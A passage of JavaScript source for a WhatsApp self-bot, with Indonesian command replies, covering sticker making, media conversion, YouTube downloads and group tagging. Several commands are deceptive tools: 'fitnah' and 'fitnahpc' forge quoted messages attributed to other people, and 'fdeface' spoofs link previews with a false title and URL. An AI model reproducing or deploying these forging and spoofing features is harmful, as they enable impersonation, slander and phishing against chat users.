teks += `${i.link}\n`
teks += `${i.nama}`
}
reply(teks)
})
break
// Maker By Haikal
case 'fox':  
                   anu = await fetchJson(`https://some-random-api.ml/img/fox`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break                   
                   case 'cat':  
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break                                      
                   case 'bird':  
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'koala':  
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'meme':  
                   anu = await fetchJson(`https://some-random-api.ml/meme`)
                   anu1 = await getBuffer(anu.image)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak`, quoted: mek})
                   break
// Group Info ( HW MODS WA )
case 'groupinfo':
if (!isGroup) return
ppUrl = await Haikal.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
Haikal.sendMessage(from, buffergbl, image, {quoted: mek, caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`})
break
// Nulis By Haikal
case 'nulis1':  
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} nama & kelas & nulis*`)
                    var F = body.slice(8)
			        var F1 = F.split("&")[0];
			        var F2 = F.split("&")[1]; 
			 	   var F3 = F.split("&")[2]; 
                    freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis?nama=${F1}&kelas=${F2}&text=${F3}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `Nih Kak`, quoted: mek})
                    break
case 'nulis2':  
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)                    
                    var F = body.slice(8)         
			                    freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${F}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: mek}) 
                    break 
                    case 'nulis3':  
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`) 
                    var F = body.slice(8)          
    			                        freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis6?text=${F}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: mek}) 
                    break                
  // Tagal By Haikal                 
case 'tagall':
if (!mek.key.fromMe) return 
            if (!isGroup) return reply(mess.only.group)
            members_id = []
                teks = (args.length > 0) ? body.slice(8).trim() : ''
                teks += '\n\n'
                for (let mem of groupMembers) {
                    teks += `•> @${mem.jid.split('@')[0]}\n`
                    members_id.push(mem.jid)
                }
                mentions(teks, members_id, true)
            break
    case 'on':
            if (!mek.key.fromMe) return 
            offline = false
            freply(' ``ANDA TELAH ONLINE``` ')
            break       
    case 'status':
            freply(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            freply(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            freply(bu)
            })   
            break    
            case 'owner':
case 'admin':
if (!mek.key.fromMe) return 
let ini_list = []
for (let i of ownerNumbers) {
const vname = Haikal.contacts[i] != undefined ? Haikal.contacts[i].vname || Haikal.contacts[i].notify : undefined
ini_list.push({
"displayName": 'HW MODS WA',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${Haikal.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await Haikal.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
Haikal.sendMessage(from,'Nih Kak Owner Ku ><',text,{quoted: hehe})
break
                  break
    case 'kontag':
            if (!mek.key.fromMe) return reply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            Haikal.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            Haikal.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            freply(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await Haikal.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await Haikal.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return freply('Reply videonya!')
            freply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return freply('Reply videonya!')
            freply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return freply('Reply videonya!')
            freply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return freply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            Haikal.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            Haikal.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'l9':
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `Haikal`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `BOT`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, Haikal, mek, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            Haikal.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            Haikal.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            Haikal.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            Haikal.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!q) return freply('Isi teksnya!')
            Haikal.sendMessage('status@broadcast', `${q}`, extendedText)
            freply(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Haikal.downloadMediaMessage(swsw)
            Haikal.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            Haikal.sendMessage(from, bur, text, { quoted: mek })
            } else {
            freply('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Haikal.downloadMediaMessage(swsw)
            Haikal.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            Haikal.sendMessage(from, bur, text, { quoted: mek })
            } else {
            freply('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await Haikal.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await Haikal.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		Haikal.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
          	if (!mek.key.fromMe) return freply('SELF-BOT')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	freply(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!mek.key.fromMe) return freply('SELF-BOT')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	freply(`「 *SELF-MODE* 」`)
          	break
 	case 'hidetag':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await Haikal.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			Haikal.sendMessage(from, optionshidetag, text)
			break
	case 'listadmin':
	                if (!mek.key.fromMe) return freply('SELF-BOT')
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\n𝗧𝗼𝘁𝗮𝗹 : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
	case 'play':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                Haikal.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            Haikal.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break            
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await Haikal.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await Haikal.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
			if (!q) return freply(mess.wrongFormat)
			fake = q
			freply(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await Haikal.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			freply('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await Haikal.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			freply('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'bisakah':
				if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					Haikal.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					break
	case 'kapankah':
				if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
					kapankah = body.slice(1)
